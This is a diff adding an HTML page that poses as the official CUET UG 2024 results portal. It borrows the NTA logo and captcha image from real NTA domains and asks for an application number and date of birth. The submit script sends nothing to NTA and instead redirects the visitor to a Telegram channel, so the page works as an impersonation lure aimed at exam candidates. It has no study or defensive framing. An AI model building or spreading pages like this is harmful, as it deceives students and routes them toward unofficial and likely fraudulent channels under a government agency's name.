@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CUET UG 2024 Results</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f7f7f7;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+        .logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #007bff;
+            border: none;
+            color: white;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .captcha {
+            margin: 10px 0;
+            display: flex;
+            align-items: center;
+        }
+        .captcha img {
+            margin-right: 10px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://exams.nta.ac.in/CUET-UG/images/nta-logo.webp" alt="NTA Logo" class="logo">
+    <h1>CUET UG 2024 Results</h1>
+    <form id="resultsForm">
+        <input type="text" name="application_number" placeholder="Application Number" required>
+        <input type="date" name="dob" placeholder="Date of Birth" required>
+        
+        <div class="captcha">
+            <img src="https://cuetug.ntaonline.in/frontend/web/answer-key-challenge/captcha?v=669605755660f1.82078664" alt="Captcha">
+            <input type="text" name="captcha" placeholder="Enter Captcha" required>
+        </div>
+        
+        <button type="submit">Submit</button>
+    </form>
+</div>
+
+<script>
+    document.getElementById('resultsForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+        window.location.href = 'https://t.me/CUETbyNTA_2024';
+    });
+</script>
+
+</body>
+</html>
